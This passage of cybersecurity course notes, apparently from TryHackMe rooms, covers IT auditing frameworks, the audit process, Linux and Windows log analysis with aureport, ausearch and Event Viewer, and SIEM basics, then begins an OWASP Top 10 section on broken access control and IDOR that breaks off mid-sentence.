![https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/19ce2492b22d77fc5515181db0f37ca2.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/19ce2492b22d77fc5515181db0f37ca2.png)

- We will enter the configuration name and select options like **scan** or **scan and install patches** immediately. In the next section, we must enter all the necessary details for patching.

## **AUDITING AND MONITORING**

**Introduction**

Consider the following example. A prestigious hospital in the UK must
ensure that it aligns with all the regulations. You are part of the team
responsible for ensuring compliance with the Data Protection Act (2018).
One of the requirements is to ensure that patients’ records are kept
confidential and protected against unauthorised processing, access,
loss, or destruction. Consequently, the management provided the staff
with substantial relevant training to raise awareness and equip them
with all the necessary tools to ensure compliance. Does this mean that
the hospital is now in compliance with the requirements of the Data
Protection Act (2018), especially when handling patient records?

Policy violations come in various forms. Some staff might copy
patient-related data using a USB flash memory for easy access. Others
might dispose of confidential paper records without using the allocated
paper shredders. Some might be taking photos of the computer screen to
share it via unauthorised channels to make work “more efficient.” The
examples are countless, and most of the “workarounds” might lead to
violations of the applicable laws, which can lead to lawsuits against
the hospital. We must ensure that everyone is doing their best to
observe all laws and regulations to the best of their abilities.

We need some systematic and objective way to evaluate the hospital’s
standing, i.e., auditing. We must regularly audit the processes and
controls to ensure the hospital abides by all the related regulations
and laws. Without auditing, there is no way to know what needs to be
fixed.

In other words, when we ask questions such as: How can we know
whether a company complies with the applicable laws and industry
standards? How can we assess the effectiveness the risk management and
internal controls? How can we detect fraudulent activities or misuse of
resources? The answer lies in auditing.

## What is Auditing?

In simple terms, auditing is like a check-up for a company or
organisation. It involves carefully examining the company’s processes,
internal controls, and financial statements to ensure everything runs
smoothly according to the policies and laws. Auditors look for problems,
such as errors, inefficiencies, or shady activities, and suggest ways to
fix them. This helps the company improve its operations and builds trust
with the people involved or affected by the organisation’s
activities.

In more formal terms, auditing is a systematic, independent, and
objective process of gathering and evaluating evidence to determine if
an organisation, its policies, processes, controls, or financial
statements comply with applicable laws, regulations, and industry
standards.

## What is Monitoring?

As per the title of this room, the focus is on auditing and
monitoring. Before moving to the next task, let’s briefly explain
monitoring. In information systems, monitoring is about continually
checking a computer’s or network’s performance and behaviour. It
involves watching over various components such as applications, storage,
and networking to make sure they’re working well together. Monitoring
also looks for unusual behaviour and checks if anything violates
established rules or policies.

In this room, we will cover auditing and monitoring in more detail
and visit related concepts such as logging.

**Audit Objectives and Types**

## Audit Definition

In **finance**, **auditing** is an official
inspection and verification of an organisation’s financial records,
procedures, and statements to ensure accuracy, reliability, and
compliance with applicable laws, regulations, and accounting standards.
In simple terms, an audit aims to verify the financial records of
individuals and businesses.

However, when it comes to **information systems**,
**auditing** has a broader meaning as it goes beyond financial records and procedures. Auditing of information systems
involves the systematic, independent, and objective examination of an
organisation’s IT infrastructure, processes, and controls.

Furthermore, the audit of information systems has more encompassing
objectives. The objectives of an information systems audit are to
evaluate the **effectiveness, security, and compliance** of
systems and data management within an organisation. By conducting an
information systems audit, auditors can assess various aspects of an
organisation’s IT infrastructure, processes, and controls.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8b97a84584dcf05a864a9a41b57c31c3.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/8b97a84584dcf05a864a9a41b57c31c3.svg)

## Audit Objectives

By conducting an information systems audit, auditors can assess
various aspects of an organisation’s IT infrastructure, processes, and
controls. Some primary objectives of an information systems audit
include the following:

- **Assess the effectiveness of internal controls:** This
process can help mitigate the risk of fraud, errors, and other
disruptions to the organisation’s operations.
- **Identify and assess risks:** This process can help
the organisation develop and implement appropriate controls to mitigate
risks to the organisation’s information systems.
- **Assess the efficiency and effectiveness of information
systems:** This process can help the organisation improve the
performance of its information systems and make better decisions about
future investments in information technology.
- **Ensure compliance with laws and regulations:** This
process can help protect the organisation from fines, penalties, and
other legal sanctions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/75c79a395dc6062360af9e02bd4bb5d5.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/75c79a395dc6062360af9e02bd4bb5d5.svg)

More generally, information systems audits can be used for a broader
set of targets, depending on the industry and regulations. In more
formal terms, information systems audit serves the following
objectives:

- **Risk assessment:** Identify potential risks and
vulnerabilities that may affect information assets’ confidentiality,
integrity, and availability and evaluate risk mitigation strategies in
place.
- **Regulatory compliance:** Ensure that an
organisation’s information systems adhere to relevant laws, regulations,
and industry standards to avoid legal violations and safeguard the
organisation’s reputation.
- **IT governance:** Evaluate the effectiveness of IT
governance practices, including decision-making processes, resource
allocation, and performance management within the organisation.
- **Security management:** Assess the effectiveness of an
organisation’s information security policy, processes, and controls in
protecting information assets from unauthorised access, use,
modification, and disclosure.
- **Operational and performance evaluation:** Assess the
controls and processes for key IT activities such as system design,
development, implementation, and ongoing maintenance, ensuring that the
organisation’s systems and resources are utilised efficiently and that
desired goals and outcomes are achieved.
- **Data management and quality:** Evaluate the processes
and controls for data storage, retention, backup, and recovery to ensure
that critical data is accurate, complete, reliable, and available when
needed.
- **Business continuity and disaster recovery:** Assess
the adequacy of an organisation’s strategies for maintaining critical IT
services and capabilities during various business disruptions, including
assessing backup and contingency plans to ensure timely recovery.
- **Fraud detection and prevention:** Identify fraudulent
activities or misuse of resources by examining user activity,
authorisation, and the overall control environment.

By identifying potential vulnerabilities, weaknesses, or
irregularities, IT auditors help prevent unauthorised access, data
breaches, system failures, and legal violations, strengthening
information security and ensuring the integrity, confidentiality, and
availability of critical IT resources and information assets.

## Audit Types

One way to classify audits is based on who is performing the
audit:

- **Internal audits:** These are performed by an
organisation’s personnel or staff members assigned to the internal audit
function.
- **External audits:** External audits are conducted by
independent auditors not employed by the organisation being audited.
These auditors are typically from external accounting or auditing firms,
and the primary purpose is to provide an impartial and objective
review.

Generally speaking, we would start with an internal audit to verify
that the company is carrying out the different procedures correctly. In
the next stage, we would pay for an external audit to help discover what
we might have missed with our internal team. If we don’t start with an
internal audit, we will most likely need multiple external audits, which
can get quite expensive.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e7dc87990ef6bb5e6e348baafea24ef7.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/e7dc87990ef6bb5e6e348baafea24ef7.svg)

In addition to internal and external audits, we have:

- **Third-party audits:** This type of audit is conducted
when an organisation needs to assess its IT systems or controls within
third parties, such as vendors, service providers, or subcontractors.
Third-party audits ensure that the external entities a company relies on
adhere to the required security, data protection, and compliance
standards, thereby minimising potential risks and exposures that may
arise from their operations.

**Audit Frameworks**

An audit framework is a structured approach comprising principles,
concepts, and practices used to conduct an audit. It provides guidelines
on planning, executing, and reporting on an audit effectively and
ensures that audits are objective and consistent. Audit frameworks help
auditors assess an organisation’s policies, processes, controls, and
compliance with regulations while providing efficiency, value, and
transparency to the audit process.

## Popular Audit Frameworks

- **COSO:** The Committee of Sponsoring Organizations of
the Treadway Commission (COSO) is a private-sector initiative that
develops frameworks for enterprise risk management, internal control,
and fraud deterrence. COSO’s [Internal
Control-Integrated Framework](https://www.coso.org/sitepages/internal-control.aspx) is one of the most widely used
frameworks for auditing internal controls. It is typically used in
various industries, including financial services, healthcare, and
government.
- **COBIT:** The [Control Objectives for
Information and Related Technology](https://www.isaca.org/resources/cobit) (COBIT) is a framework for the
governance and management of information and technology (IT). It
provides a comprehensive set of control objectives that can be used to
assess the effectiveness of an organisation’s IT governance and
management practices. It is typically used in various industries,
including financial services, healthcare, and government.
- **ISAE 3402:** [ISAE3402](https://isae3402.com/ISAE3402_overview.html) is an international standard that provides guidance on the
assurance of controls over financial reporting. Auditors use it to
assure of the effectiveness of an organisation’s internal
controls over financial reporting. It is typically used in various
industries, including financial services, healthcare, and
government.
- **ISO 27001:** [ISO 27001](https://www.iso.org/standard/27001) is an
international standard for information security management. It provides
a set of best practices for information security management. It is
typically used in various industries, including financial services,
healthcare, and government.
- **ITIL**: ITIL stands for Information Technology
Infrastructure Library. It is a framework of best practices for IT
Service Management (ITSM). ITIL is used in auditing to establish a
systematic approach for assessing an organisation’s management and
governance of IT services. By providing standard practices and criteria,
ITIL helps organisations identify areas where their ITSM practices can
be improved and to provide recommendations for how to make those
improvements.
- **PCI DSS:** The [Payment
Card Industry Data Security Standard](https://www.pcisecuritystandards.org/document_library/?document=pci_dss) (PCI DSS) is a set of security
requirements for organisations that accept payment cards. It is designed
to protect cardholder data from unauthorised access, use, disclosure,
alteration, or destruction. It is typically used in industries that
accept payment cards, such as retail, hospitality, and healthcare.
- **SOX:** The Sarbanes-Oxley Act of 2002 (SOX) is a
federal law that establishes auditing and financial reporting
requirements for public companies. It is designed to protect investors
by improving the accuracy and reliability of financial reporting. It is
typically used in public companies.

| Framework | Description | Industries | Notes |
| --- | --- | --- | --- |
| COSO | Internal control framework that helps organisations design,
implement, and monitor their internal controls. | All industries | COSO is a comprehensive framework that covers all aspects of
internal control. |
| COBIT | IT governance framework that helps organisations align their IT with
their business goals. | All industries | COBIT is a flexible framework that can be adapted to the needs of
any organisation. |
| ISAE 3402 | Assurance standard that provides assurance on the controls of a
service organisation. | All industries | ISAE 3402 is a relatively new standard gaining popularity in the
financial services industry. |
| ISO 27001 | Information security management system (ISMS) standard that helps
organisations protect their information assets. | All industries | ISO 27001 is the world’s most widely adopted ISMS standard. |
| ITIL | IT service management (ITSM) framework that helps organisations
deliver high-quality IT services. | All industries | ITIL is a well-established framework that organisations of all sizes
use. |
| PCI DSS | Payment Card Industry Data Security Standard that helps
organisations protect cardholder data. | Financial services | PCI DSS is a mandatory standard for organisations that process
credit and debit card payments. |
| SOX | Sarbanes-Oxley Act that sets requirements for internal controls over
financial reporting. | Publicly traded companies | SOX is a complex law that has a significant impact on public
companies. |

**Auditing IT Infrastructure and Operations**

## Audit Process

The process typically consists of the following primary stages:

- **Planning:** The auditor determines the audit’s scope,
objectives, and timelines. This stage involves understanding the
organisation’s IT environment – including infrastructure, systems,
applications, security measures, and data management practices – and
identifying potential risks and controls to be evaluated.
- **Information gathering:** The auditor collects
relevant data, background information, and documentation to thoroughly
understand the organisation’s IT processes and systems. This process
typically involves interviewing key personnel, reviewing resource
documentation, analysing procedures and policies, and examining the
control environment.
- **Risk assessment and control evaluation:** The auditor
identifies and assesses the risks and vulnerabilities within the
organisation’s IT infrastructure, processes, and systems based on the
information gathered. This process includes evaluating the effectiveness
of internal controls, security measures, and compliance with applicable
policies, regulations, and industry standards.
- **Testing:** The auditor performs detailed tests on
selected systems, applications, specific processes or control procedures
to validate their effectiveness, accuracy, and compliance. Testing
methods may include data analysis, vulnerability scanning, penetration
testing, controls testing, or sampling, depending on the audit
objectives and the audited systems.
- **Analysis and findings:** The auditor analyses the
testing and evaluation results, identifies deviations, irregularities,
or vulnerabilities, and evaluates the implications. Auditors determine
if systems are configured securely, IT processes are effective and
compliant, or risks are adequately mitigated.
- **Reporting:** After the analysis, the auditor
documents the findings and conclusions, makes recommendations for
improvement where necessary, and prepares a formal audit report. This
report is then shared with the management, the audit committee, or other
stakeholders as required, helping them understand the organisation’s
risk exposure, compliance, and effectiveness of IT processes and
controls.
- **Follow-up:** In some cases, a follow-up may be
performed to evaluate if the recommended improvements and corrective
actions have been implemented and ensure their effectiveness in
addressing the identified issues.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0cb12b9888051e3b38862431cdbe5da.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/a0cb12b9888051e3b38862431cdbe5da.svg)

## Audit Areas

The following is a list of some areas that we might consider
inspecting when performing an information systems audit:

- **Information Systems Hardware:** Inspect the hardware
configuration and performance to ensure it meets the organisation’s
needs.
- **OS:** Check the operating system configuration and
security to ensure it is secure and compliant with organisational
policies.
- **File Systems:** Check the file system permissions and
access control to ensure that sensitive data is protected.
- **Database Management Systems:** Audit the database
configuration and security to ensure it is secure and compliant with
organisational policies.
- **Network Infrastructure:** Inspect the network
configuration and security to ensure it is secure and compliant with
organisational policies.
- **Network Operating Controls:** Audit the network
operating controls to ensure that they effectively prevent unauthorised
access to the network.
- **IT Operations:** Examine the IT operations to ensure
they effectively deliver high-quality IT services.
- **Lights-Out Operations:** Check the lights-out
operations to ensure they effectively manage IT infrastructure without
the need for human intervention.
- **Problem Management Operations:** Audit the problem
management operations to ensure that they effectively resolve IT
problems in a timely manner.
- **Monitoring Operations:** Validate the monitoring
operations to ensure they effectively detect and respond to IT
incidents.
- **Procurement:** Check the procurement process to
ensure that IT hardware and software are secure and compliant.
- **Business Continuity Planning:** Inspect the business
continuity plan to ensure that it effectively ensures the continuity of
critical IT services during a disaster.
- **Disaster Recovery Planning:** Examine the disaster
recovery plan to ensure it effectively recovers critical IT services
during a disaster.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dba9331e7a3f7069a4785989b4362311.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/dba9331e7a3f7069a4785989b4362311.svg)

## Audit Scenario

Let’s say that we are auditing a company using COBIT. We might go
through a series of steps that resemble the following:

### Step 1: Planning

- **Define the scope of the audit:** We start by defining
the scope of the audit and identifying the relevant COBIT domains that
apply to the organisation’s IT governance practices.
- **Identify the relevant COBIT controls:** Next, we
identify the appropriate COBIT controls that are in place to mitigate
the risks identified in the scope of the audit.
- **Develop an audit plan:** We will need to develop an
audit plan that outlines the steps that will be taken to gather evidence
and assess the organisation’s compliance with the relevant COBIT
controls.

**Note:** The COBIT 2019 framework defines 40 control
objectives, which are grouped into five domains:

- **Plan and Organise (PO):** 13 control objectives
- **Acquire and Implement (AI):** 9 control
objectives
- **Deliver and Support (DS):** 11 control
objectives
- **Monitor and Evaluate (ME):** 7 control
objectives
- **Resilience (RES):** 1 control objective

The details of the COBIT controls are beyond the scope of this room.
However, for this exercise, we need to know that the COBIT controls
provide a framework for ensuring that IT activities are aligned with the
organisation’s strategic goals and objectives.

### Step 2: Execution

- **Gather evidence:** We start this stage by gathering
evidence of the organisation’s compliance with the relevant COBIT
controls. This evidence may include documentation, interviews, and
observations.
- **Assess the evidence:** Next, we assess the evidence
to determine whether the organisation complies with the relevant COBIT
controls.

### Step 3: Assessment

- **Identify gaps in compliance:** First, we must
identify gaps in the organisation’s compliance with the relevant COBIT
controls.
- **Make recommendations for improvement:** Next, we can
make recommendations for improvement to the organisation’s IT governance
practices.

### Step 4: Reporting

- **Prepare the audit report:** We begin by preparing an
audit report summarising the audit findings and making recommendations
for improvement.
- **Communicate the audit report:** Once the report is
ready, we must communicate it to the organisation’s management and
stakeholders.

### Step 5: Follow-up

- **Monitor the implementation of
recommendations:** Ideally speaking, we will be able to monitor
the implementation of the recommendations made in the audit report to
ensure that the organisation is taking steps to improve its IT
governance practices.

The steps above show an example of an information systems audit using
the COBIT framework. The exact steps involved in an audit will vary
depending on the organisation’s needs and requirements. However, the
general steps outlined above apply to most information systems
audits.

**Logs**

Logging is the process of recording events as they take place on a
computer system. These events can be:

- Problems and errors
- Information about current operations

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/34eba2c08178d14912c00fd1ff7e5524.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/34eba2c08178d14912c00fd1ff7e5524.svg)

Some of the purposes of logging are:

- **Troubleshooting**: Logs can be a valuable tool for troubleshooting
errors. For instance, if a server fails to start, we would look at its
logs to discover where it failed and what prevented it from
starting.
- **Monitoring**: Logs provide plenty of insight into the utilisation of a
system’s resources. Consider the case where a server is slow, and we
want to discover the bottleneck affecting its performance. The system
might run low on memory, or the CPU might reach 100% utilisation for
non-trivial durations. Logs can provide the necessary insights to
pinpoint and solve the problem.
- **Auditing**: Logs record users’ activities on a given system. On an
audited system, we want to know who logged in, what files they accessed,
and what changes they made. This information is necessary to audit a
system or investigate any incident.
- **Compliance**: Logs can be a requirement to maintain compliance with
relevant regulations. For instance, financial institutions need to keep
logs of all financial transactions that take place.

**Log Management on Linux**

Linux logs are an essential part of Linux system administration, as
they provide a look into the system’s operation and reveal any issues
that may be happening. This information can include errors, warnings,
and security alerts, in addition to more innocuous events. Most Linux
distributions store the log files and directories in
`/var/log`.

An example `/var/log` directory content is shown in the
terminal below.

Terminal

```
root@TryHackMe# sudo tree /var/log -d -L 2/var/log
├── akmods
├── anaconda
├── audit
├── blivet-gui
├── chrony
├── cups
├── displaylink
├── gdm
├── glusterfs
├── httpd
├── journal
│   └── f29b4ed41359484da9b7d3bf3ec279ac
├── libvirt
│   ├── libxl
│   ├── lxc
│   └── qemu
├── ppp
├── private
├── qemu-ga
├── samba
│   └── old
├── speech-dispatcher
├── sssd
├── swtpm
│   └── libvirt
└── vmware
```

The importance of Linux logs lies in troubleshooting and monitoring
as they help admins identify suspicious activities, diagnose system
hardware and software problems, track system health, and gauge
performance. For handling logs, many Linux distributions use system
logging daemons like `rsyslog`, `syslog-ng`, and
`journald` to manage, process, and store log events.

## Log Types

There are several different types of logs on a Linux system. Some
common types of logs include:

- **System logs**: These logs contain information about
the general health and operation of the system.
- **Application logs**: These logs contain information
about the specific applications running on the system.
- **Security logs**: These logs contain information about
security-related events, such as login and failed authentication
attempts.

## Managing Logs on a Linux
System

To efficiently work with Linux logs, we need to consider the
following:

- Log to a central location
- Use a tool to filter and parse the logs
- Setup alerts

Configuring a Linux system to log in to a central location is
essential. This setup will make it easier to collect and manage our
logs.

Additionally, using a tool that can filter and parse the generated
logs would be best. This configuration will help us to find the
information we need quickly and easily.

Finally, we should set up alerts to notify us of important events.
This setup will help us respond to problems quickly.

One of the efficient command-line tools to audit system logs on a
Linux system is `aureport`. You can get a summary of the
events using the command `aureport --summary`. If you are
only interested in the failed events, you can use
`aureport --failed` as shown in the terminal window
below.

Terminal

```
root@TryHackMe# aureport --failedFailed Summary Report
======================
Range of time in logs: 06/08/2023 12:18:12.635 - 07/06/2023 23:09:20.083
Selected time for report: 06/08/2023 12:18:12 - 07/06/2023 23:09:20.083
Number of changes in configuration: 0
Number of changes to accounts, groups, or roles: 5
Number of logins: 0
Number of failed logins: 87
Number of authentications: 0
Number of failed authentications: 421
[...]
```

We can quickly spot the high number of failed logins and
authentications: **87** and **421**. Please note that the number of failed
authentications is higher than the number of failed logins, as one
failed login results in multiple failed authentications, depending on
the system setup. Let’s discover which account has a high number of
failed logins.

The following command
`ausearch --message USER_LOGIN --success yes --interpret`
returns successful logins, while
`ausearch --message USER_LOGIN --success no --interpret`
returns the failed logins. The options are:

- `-message` is followed by the message we are interested
in searching for. Examples include `USER_LOGIN`,
`DEL_USER`, `ADD_GROUP`,
`USER_CHAUTHTOK`, `DEL_GROUP`,
`CHGRP_ID`, `ROLE_ASSIGN`, and
`ROLE_REMOVE`.
- `-success` is followed by `yes` or
`no` depending on whether you are searching for successful or
unsuccessful attempts, respectively.
- `-interpret` converts numeric entities, such as UID
(User ID), into text.

If we only want to display the failed login attempts for the
`root` account, we can pipe the output via `grep`.
The command becomes
`ausearch --message USER_LOGIN --success no --interpret | grep ct=root`.

The command above would result in a very long list. Since we are
interested in counting the lines, we can pipe the output again through
`wc -l`. `wc` is used for counting characters,
words, and lines. The `-l` will only display the line count.
Consequently, a straightforward way to count the number of failed
`root` logins is by issuing the following command.

Terminal

```
root@TryHackMe# ausearch --message USER_LOGIN --success no --interpret | grep ct=root | wc -l76
```

The command above can be written in its short form as shown
below:

Terminal

```
root@TryHackMe# ausearch -m USER_LOGIN -sv no -i | grep ct=root | wc -l76
```

The output above tells us that 76 failed login attempts have been at
the root account.

**Log Management on MS Windows**

Windows logs, sometimes referred to as event logs, form an integral
part of the operating system’s functionalities, providing insights into
system behaviour and potential issues. Four primary types include:

- **System Logs**: This records activity associated with
the system components, such as driver failure, resource conflict, and
hardware issues. For IT professionals, they serve as sources of critical
diagnostics information.
- **Application Logs**: This type concerns individual
software living upon the system. When issues manifest around a specific
application, such as failing to connect to a database or process-related
bottlenecks, these logs come in handy to determine why the failure
occurred.
- **Security Logs**: Specialised logs designed to track
security events. They touch on events such as logon and logoff actions,
user rights assignments, policy changes, and security-related
aberrations. For security professionals, this often represents their
first check when investigating a security incident.
- **Forwarded Events Logs**: These logs receive collected
from other tertiary-tertiary computing environments. They act as
collated reports, pulling from multiple sources into a centralised file.
They are ideal for monitoring tasks and analysis in a networked
environment, where you may need to assemble data from various places
into a cohesive analysis.

Correctly analysing Windows logs empowers administrators to address
security issues promptly, facilitating strong performance and
troubleshooting any potential problems efficiently.

The table below provides a short and basic comparison between Linux
logs and Windows logs.

| Feature | Linux Logs | Windows Logs |
| --- | --- | --- |
| Location | `/var/log` | `%SystemRoot%\System32\Logfiles` |
| Format | Syslog | EventLog |
| Logging levels | Debug, Info, Notice, Warning, Error,
Critical | Debug, Information, Warning, Error,
Critical |
| Tools for viewing logs | `tail`, `grep`,
`less` | Event Viewer |
| Advantages | More flexible, easier to parse | More user-friendly, more integrated with
Windows |
| Disadvantages | Can be less intuitive, less
centralized | Can be more difficult to troubleshoot |

## Audit Policy

Microsoft Windows makes it possible to audit various aspects of the
system. Here is a list of example events you can audit:

- Account logon events
- Account management
- Privilege use
- Directory service access
- Policy change
- System events

For more information, we recommend you visit [Audit
Policy](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/audit-policy).

## Windows Event Viewer

Click on the **Start Machine** button to follow along. You will 
also need
it to answer the questions at the end of this task. You can log into the
 attached VM using a Remote Desktop client via the AttackBox or your VPN
 Connection. The login credentials
are:

- Username: `dawn`
- Password: `AuditMe!`

Let’s start the Event Viewer, then open Security under the Windows
Logs. We can see the different events that have occurred, including
those we configured MS Windows 2019 to log as part of auditing. In the
screenshot below, we have selected an event with ID 4624, i.e., a user
has successfully logged in to a system.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1d030dd062ddb6737be9091b08cd9c89.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/1d030dd062ddb6737be9091b08cd9c89.png)

Click to enlarge image.

The table below shows some example logon event IDs.

| Logon events | Description |
| --- | --- |
| 4624 | A user successfully logged on to a
computer. |
| 4625 | Logon failed due to an unknown username or
a wrong password. |
| 4634 | The logoff process was completed. |
| 4647 | A user started the logoff process. |
| 4779 | A user disconnected from a remote session
without logging off. |

**Monitoring**

Information systems monitoring involves continuously observing and
checking an IT system’s performance and metrics. It can include
reviewing processes, users, workflows, transactions, data storage,
applications, servers, networks, and security protocols. It’s a
proactive technical system that helps identify potential disruptions
before they cause serious issues or system shutdowns.

Monitoring is crucial for several reasons:

- **Troubleshooting and Maintenance**: Monitoring data
helps IT support teams identify and rectify operational faults more
efficiently, ensuring systems run smoothly and effectively with minimum
downtime.
- **Performance Optimisation**: By keeping track of
information usage, transmission rates, and latency, fine-tuning
strategies can be applied to optimise the performance of the
systems.
- **Preventing Failures**: Proactively spotting potential
issues or irregular patterns, such as close-to-capacity servers or
faulty hardware, forms a significant aspect of preventing more
significant failures.
- **Security Risk Mitigation**: Continuous monitoring
helps identify unauthorised access, security breaches, or malicious
activity, enabling immediate reaction and thus enhancing system
security.
- **Regulatory Compliance**: Continuous monitoring is
crucial for organisations under regulatory controls to meet and prove
compliance with data protection and privacy laws.

Logging, on the other hand, is a form of data collection and a
record-keeping activity. A log typically records events or activities
that software or systems perform, as discussed in the previous
tasks.

While both involve in-depth analysis of system behaviour, the key
difference between logging and monitoring lies in their primary
functions and use. Logging provides a historical account of events for
later analysis or audit review; it is essential for diagnostic,
forensics, and compliance purposes. Monitoring is a real-time,
continuous process used to detect issues or anomalies immediately; it
ensures effective operational control, security, and optimal
performance.

|  | Logging | Monitoring |
| --- | --- | --- |
| **Primary Function** | To record system activities for later
review | To deliver real-time observation of system
status |
| **Error Detection** | After it hits, provides a data trail to
backtrack the issue | Identify and notify irregularities as they
occur |
| **Process** | A constant, passive process recording
activities and system changes | An active, ongoing process receiving
alerts or warnings based on predefined triggers |
| **Typical Uses** | Error diagnostics post-issue, compliance
proof, audit trails, forensic analysis | Daily operational tracking, preventative
maintenance, bottlenecks detection, real-time functionality and
security |
| **Timeliness of Notification and
Inspection** | Used primarily for retrospective analysis
of problems | Real-time reporting of potential
issues |
| **Key Objectives** | Error diagnosis, accountability and
providing detailed context | Eradicate small issues from escalating and becoming larger problem |

Overall, effective information systems monitoring fosters a stable IT
infrastructure that is key to an organisation’s technological
development, resilience, and integrity.

**SIEM Basics**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/394ecb48936ee792b1197c1cd2f7bf89.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/394ecb48936ee792b1197c1cd2f7bf89.svg)

Security Information and Event Management (SIEM) is a set of
integrated management technologies that provide a holistic view of an
organisation’s information security. SIEM systems collect and aggregate
log data generated throughout the organisation’s IT infrastructure from
network devices, systems, and applications.

SIEM software then identifies and categorises incidents and events
and analyses them. This analysis can be beneficial for identifying
issues such as security threats, compromised systems, and malicious
activities. It can also help with potential incident response
actions.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7f7d18c7dcd2eea96e14a0bca68d23dc.svg](https://tryhackme-images.s3.amazonaws.com/user-uploads/5f04259cf9bf5b57aed2c476/room-content/7f7d18c7dcd2eea96e14a0bca68d23dc.svg)

The key capabilities of SIEM technology include:

- **Data Aggregation**: It can collect data from many
sources, such as network devices, security controls, servers, and
databases, providing a global perspective of the IT environment.
- **Correlation and analysis**: SIEM systems can
correlate different events and logs to see patterns of possible
malicious activity.
- **Alerting and reporting**: Based on the analysis
performed on data, SIEM can automatically raise alerts upon identifying
any abnormal activity and create dashboards/reports for IT
administrators.
- **Forensic Analysis**: It helps perform historical
analysis against the event data for investigating and mitigating cyber
threats.
- **Threat intelligence Feeds**: Many SIEM tools
integrate threat intelligence feeds to enhance incident detection and
proactively identify external threats.
- **Automation and Orchestration**: Some sophisticated
SIEMs will also have capacities to automatically respond to some
detected incidents, for example, by blocking IP addresses or
deactivating vulnerable services.

SIEM is a vital tool for ensuring compliance with internal and
external security policies and maintaining a solid security posture
across an organisation.

There are many SIEM solutions available such as Wazuh and Splunk. To
get a hands-on experience working with a SIEM, we recommend the [Wazuh](https://tryhackme.com/room/wazuhct) and the [Splunk: Basics](https://tryhackme.com/room/splunk101)
rooms.

**Conclusions**

Logging, monitoring, and auditing are critical components of data
management and cyber security strategies.

Logging captures detailed event records about system operations,
often serving as the first point of reference in troubleshooting or
system optimisation.

Monitoring is a real-time continuation of the logging process,
offering immediate glimpses into system health and performance and the
capacity to identify potential problems before they escalate.

On the other hand, auditing provides a systematic review of logs and
monitoring histories necessary for regulatory compliance. It helps
identify discrepancies or issues, attributing accountability for system
actions. Notably, logging, monitoring, and auditing foster a
system environment with enhanced security, credibility, performance, and
regulatory integrity.

Below is a summary table comparing logging, monitoring, and
auditing.

|  | Logging | Monitoring | Auditing |
| --- | --- | --- | --- |
| **Definition** | Recording of system activities and
changes | Real-time data and report collection to
observe system status | Systematic analysis and review of actions
within the systems |
| **Main function** | Stores a historical account of system
processes, activities, or events | Records and visualises the live state of
systems | Checks compliance with set IT standards
and corrective actions |
| **Result
identification** | Often post-issue or upon check | Real-time, at the time of anomaly or
breach | Usually post-action, during compliance
checks |
| **Process flow** | Operates passively to collect data as
events transpire | Active process analysing and inspecting
system performance regularly | Performed at set times, often periodic,
can be triggered by events |
| **Uses** | Find faults, debug, forensics, assists in
audits | Maintain system performance, real-time
fault-tracking, foreseeing issues | Validate regularity, safety inspection,
prove accountability and lessening potential risks |
| **Key Role** | Data gathering and accountability | Preventive and predictive maintenance | Compliance, verification, and legal
professionalism |

## **OWASP TOP 10 -2021**

1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)

**1. Broken Access Control**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3804b69c1b754f353733fac2ccd71d31.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3804b69c1b754f353733fac2ccd71d31.png)

Websites have pages that are protected from
 regular visitors. For example, only the site's admin user should be 
able to access a page to manage other users. If a website visitor can 
access protected pages they are not meant to see, then the access 
controls are broken.

A regular visitor being able to access protected pages can lead to the following:

- Being able to view sensitive information from other users
- Accessing unauthorized functionality

Simply put, broken access control allows attackers to bypass **authorisation**, allowing them to view sensitive data or perform tasks they aren't supposed to.

For example, a [vulnerability was found in 2019](https://bugs.xdavidhu.me/google/2021/01/11/stealing-your-private-videos-one-frame-at-a-time/),
 where an attacker could get any single frame from a Youtube video 
marked as private. The researcher who found the vulnerability showed 
that he could ask for several frames and somewhat reconstruct the video.
 Since the expectation from a user when marking a video as private would
 be that nobody had access to it, this was indeed accepted as a broken 
access control vulnerability.

# Insecure Direct Object Reference

**IDOR** or **Insecure Direct Object Reference** refers to
 an access control vulnerability where you can access resources you 
wouldn't ordinarily be able to see. This occurs when the programmer 
exposes a Direct Object Reference, which is just an identifier that 
refers to specific objects within the server. By object, we could mean a
 file, a user, a bank account in a banking application, or anything 
really.

For example, let's say we're logging into our bank account, and after
